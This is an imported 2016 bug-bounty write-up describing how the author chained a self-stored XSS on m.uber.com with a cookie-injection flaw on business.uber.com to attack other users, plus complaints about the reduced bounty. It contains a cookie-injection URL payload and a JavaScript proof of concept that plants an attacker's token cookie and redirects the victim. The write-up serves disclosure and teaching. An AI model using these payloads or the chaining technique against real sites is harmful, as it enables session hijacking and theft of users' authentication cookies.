---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-08-29_turning-self-xss-into-good-xss-v2-challenge-completed-but-not-rewarded.md
original_filename: 2016-08-29_turning-self-xss-into-good-xss-v2-challenge-completed-but-not-rewarded.md
title: 'Turning Self-XSS into Good XSS v2: Challenge Completed but Not Rewarded'
category: documents
detected_topics:
- oauth
- xss
- command-injection
- otp
- csrf
- mobile-security
tags:
- imported
- documents
- oauth
- xss
- command-injection
- otp
- csrf
- mobile-security
language: en
raw_sha256: 200aa5db72624241b1089279fb43a775b2f7b587b632121cc5a1d62e08cfb96a
text_sha256: 764efb1d1dc198895b501e8c3e6e805761765e888c0b1bf441bc400491d3cd36
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Turning Self-XSS into Good XSS v2: Challenge Completed but Not Rewarded

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-08-29_turning-self-xss-into-good-xss-v2-challenge-completed-but-not-rewarded.md
- Source Type: markdown
- Detected Topics: oauth, xss, command-injection, otp, csrf, mobile-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `200aa5db72624241b1089279fb43a775b2f7b587b632121cc5a1d62e08cfb96a`
- Text SHA256: `764efb1d1dc198895b501e8c3e6e805761765e888c0b1bf441bc400491d3cd36`


## Content

---
title: "Turning Self-XSS into Good XSS v2: Challenge Completed but Not Rewarded"
page_title: "My 'Public Evernote': Turning Self-XSS into Good XSS v2: Challenge Completed but Not Rewarded"
url: "https://httpsonly.blogspot.com/2016/08/turning-self-xss-into-good-xss-v2.html"
final_url: "https://httpsonly.blogspot.com/2016/08/turning-self-xss-into-good-xss-v2.html"
authors: ["-"]
programs: ["Uber"]
bugs: ["XSS"]
bounty: "1,000"
publication_date: "2016-08-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6266
---

This appears to be the issue which I was digging for the most time during my bugbounty experience, it took more than two months to find a perfect solution for a problem.  
  
**TL;DR**  
I found Self-XSS on m.uber.com in late March 2016, and inspired by [Jack's post](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/) I didn't give up, aiming to find a way to turn it to Good-XSS.  
Finally, I found arbitrary cookie install vulnerability on business.uber.com, which allowed to install arbitrary cookies for *.uber.com for Safari users.  
Chaining two bugs together could lead to Good XSS on m.uber.com, and allowed to steal oauth2 cookie of any logged-in user.  
Another bughunter reported Self-XSS on the same domain while Uber team was resolving my issue, which resulted a fix of Self-XSS and refusal of appropriate reward.  
  
**Chaining bugs.**  
**Step 1** : Self-XSS  
Self-Stored XSS on m.uber.com launches on index page when user simply logges in. My way to add XSS into profile was by modifying existing business profile name via mobile application. As it appeared later, there was [another way to do that](https://hackerone.com/reports/134124).  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjy8nKrOhIi2TkddzzSIXqZ-GSShoVPniauyGl-O_As55pR9TeHhRt1TeHtccDY7ftK_i6Y2HfzMAQvj-M4zvhAiRS-J0JEq5KHNI3voBat38n8LOnOsEEtKYqyL_y7Neirj9gBimeUTMod/s320/m-uber.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjy8nKrOhIi2TkddzzSIXqZ-GSShoVPniauyGl-O_As55pR9TeHhRt1TeHtccDY7ftK_i6Y2HfzMAQvj-M4zvhAiRS-J0JEq5KHNI3voBat38n8LOnOsEEtKYqyL_y7Neirj9gBimeUTMod/s1600/m-uber.jpg)

  
  
**Step 2** : Arbitrary cookie installation  
Surprisingly, user can be authenticated on m.uber.com by only presenting COOKIE "token", apart from (riders|login|partners|anything).uber.com, which needs another COOKIE - oauth2. Hence, if it is somehow possible to login victim user into our account with Self Stored XSS, it is possible to steal oauth2 cookie of a real user (since it is scoped to *.uber.com) and perform any other malicious actions.  
  
Arbitrary cookie install vulnerability was very lucky to find on page https://business.uber.com/new/confirm/[exploit-here], and is based on the fact that user input comes into server's response, directly into Cookie header and is not properly sanitized. Hence it was possible to install various cookies for any *.uber.com subdomain ([original research here](https://miki.it/blog/2013/9/15/xsrf-cookie-setting-google/)):  
https://business.uber.com/new/confirm/test;,arbitrary=cookie;domain=.uber.com  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRf-gVPbOU1CKtmMiDqf2TaB0fZ0ZsLzA8FoH87D7EO86KCcE9hxVID3MD2_iDHSRgX7FDvWEslgyCXDb5D1SK3LCuOZPKZjf7EQusxM5FQ2IP0mVwegiLMYm-8BzJusDmuR9QHz0J_wmR/s320/arb-cookie.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhRf-gVPbOU1CKtmMiDqf2TaB0fZ0ZsLzA8FoH87D7EO86KCcE9hxVID3MD2_iDHSRgX7FDvWEslgyCXDb5D1SK3LCuOZPKZjf7EQusxM5FQ2IP0mVwegiLMYm-8BzJusDmuR9QHz0J_wmR/s1600/arb-cookie.png)

  
  
Combining these two minor vulnerabilities, we can attack any external user: first login victim into account with Self-XSS, and then trigger XSS against him.  
  
**PoC exploit code** :  

  
  
  <script>
  
  
  function exploit() {
  
  
  setTimeout(function() {
  var s1 = new XMLHttpRequest(); // first request is necessary for exploitation
  s1.open('GET', 'https://m.uber.com/', false);
  s1.send(null);
  
  document.location.href='https://m.uber.com/'; // now redirecting to page
  }, 3000);
  }
  </script>
  
  <body onload="exploit()">
  <script>
  
  
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.open('GET', 'https://business.uber.com/new/confirm/test;,token=XXXXXXXXXXXXXXX;domain=.uber.com', false); // insert your token here
  xmlhttp.send(null);
  
  
  </script>
  
  
  
  
  
  

  
**Good news (it works!):**  
My exploit was working since late March, and was also working at the time of my report to Uber (May 9):  

  

  

  
**Bad news:**  
I provided all evidence that Self-XSS was found by me some time before it was reported by another researcher.  
Unlikely, Self-XSS was silently patched several hours after I reported the issue through Hackerone, and I received `_We're having some trouble reproducing your proof of concept <...> Thanks again and good luck in your future bug hunting._` message from triage team.  
After involving Hackerone team into discussion, I got rewarded for 1000$ for arbitrary cookie installation, instead of 5k+ (Stored XSS with ability to steal sensitive COOKIE data).  
  
**Takeaway:**  
Never stop trying to elevate found vulnerabilities, and _please_ don't report non-security issues out-of-scope for having only +7 of reputation, when you have a feeling that the vulnerability is potentially exploitable under higher privileges. Otherwise you will be literally killing someone's bounty - and what is worse, you will never improve.
